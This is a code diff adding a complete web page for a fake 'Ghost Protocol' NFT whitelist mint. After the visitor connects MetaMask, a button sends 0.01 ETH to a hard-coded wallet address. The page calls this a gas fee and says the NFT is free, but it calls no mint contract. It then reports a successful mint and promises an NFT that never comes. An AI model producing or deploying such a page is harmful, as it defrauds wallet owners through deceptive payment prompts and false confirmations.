@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Ghost Protocol – Whitelist Mint</title>
+  <style>
+    body { background: #0a0a0a; color: white; font-family: Arial; text-align: center; padding: 50px; }
+    button { background: #00aaff; border: none; padding: 15px 30px; font-size: 20px; border-radius: 10px; cursor: pointer; }
+    button:hover { background: #0088dd; }
+    .info { margin-top: 30px; color: #aaa; font-size: 14px; }
+  </style>
+</head>
+<body>
+  <h1>👻 GHOST PROTOCOL</h1>
+  <p>Whitelist Mint – 0.01 ETH (Gas Fee)</p>
+  <button id="connectBtn">Connect MetaMask</button>
+  <div id="mintArea" style="display:none;">
+    <button id="mintBtn">Mint (0.01 ETH Gas Fee)</button>
+    <p class="info">This is the network gas fee. NFT is free.</p>
+  </div>
+  <script>
+    let userAddress = '';
+    document.getElementById('connectBtn').onclick = async () => {
+      if (typeof window.ethereum !== 'undefined') {
+        const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+        userAddress = accounts[0];
+        const chainId = await ethereum.request({ method: 'eth_chainId' });
+        if (chainId !== '0x1') {
+          alert('Please switch to Ethereum Mainnet!');
+          return;
+        }
+        document.getElementById('connectBtn').style.display = 'none';
+        document.getElementById('mintArea').style.display = 'block';
+      } else {
+        alert('MetaMask not installed!');
+      }
+    };
+    document.getElementById('mintBtn').onclick = async () => {
+      try {
+        const tx = await ethereum.request({
+          method: 'eth_sendTransaction',
+          params: [{
+            from: userAddress,
+            to: '0x7099b123d679097A7CDf9f475496A3A093811f74',
+            value: '0x2386F26FC10000'
+          }]
+        });
+        alert('Mint successful! Tx: ' + tx + '\nNFT will appear in your wallet shortly.');
+      } catch (e) {
+        alert('Error: ' + e.message);
+      }
+    };
+  </script>
+</body>
+</html>
